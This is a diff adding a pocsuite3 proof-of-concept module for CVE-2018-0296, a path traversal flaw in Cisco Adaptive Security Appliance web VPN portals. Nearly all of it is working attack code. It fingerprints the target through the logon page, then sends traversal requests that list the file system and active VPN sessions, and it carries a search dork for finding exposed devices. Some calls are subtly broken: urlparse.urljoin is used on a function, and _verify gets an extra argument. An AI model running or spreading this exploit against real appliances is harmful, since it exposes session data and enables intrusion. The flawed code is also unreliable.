@@ -1,0 +1,64 @@
+#!/usr/bin/python
+# -*- coding: utf-8 -*-
+
+from pocsuite3.api import Output, POCBase, register_poc, requests
+
+from urllib.parse import urlparse
+
+
+class TestPOC(POCBase):
+    name = "Cisco Adaptive Security Appliance - Path Traversal"
+    vulID = 'CVE-2018-0296'
+    author = ['sebao']
+    vulType = 'Path Traversal'
+    version = '1.0'  # default version: 1.0
+    references = ''
+    desc = ''
+
+
+    vulDate = ''
+    createDate = '2018-06-22'
+    updateDate = '2018-06-22'
+
+    appName = 'Cisco Adaptive'
+    appVersion = ''
+    dork="/+CSCOE+/logon.html"
+    appPowerLink = ''
+    samples = []
+
+    def _attack(self):
+
+        return self._verify(self)
+
+    def _verify(self):
+        '''verify mode'''
+        result = {}
+        filelist_dir = "/+CSCOU+/../+CSCOE+/files/file_list.json?path=/"
+        CSCOE_dir = "/+CSCOU+/../+CSCOE+/files/file_list.json?path=%2bCSCOE%2b"
+        active_sessions = "/+CSCOU+/../+CSCOE+/files/file_list.json?path=/sessions/"
+        logon = "/+CSCOE+/logon.html"
+
+        is_cisco_asa = requests.get(urlparse.urljoin(self.url, logon), verify=False, allow_redirects=False)
+
+        if "webvpnLang" in is_cisco_asa.cookies:
+            filelist_r = requests.get(urlparse.urljoin(self.url, filelist_dir), verify=False)
+            CSCOE_r = requests.get(urlparse.urljoin(self.url, CSCOE_dir), verify=False)
+            active_sessions_r = requests.get(urlparse.urljoin(self.url, active_sessions), verify=False)
+
+            if str(filelist_r.status_code) == "200" and filelist_r and CSCOE_r:
+                result['VerifyInfo'] = {}
+                result['VerifyInfo']['URL'] = self.url
+                result['VerifyInfo']['filelist'] = filelist_r.text
+                result['VerifyInfo']['CSCOE'] = CSCOE_r.text
+            return self.parse_output(result)
+
+    def parse_output(self, result):
+        output = Output(self)
+        if result:
+            output.success(result)
+        else:
+            output.fail('Internet nothing returned')
+        return output
+
+
+register_poc(TestPOC)
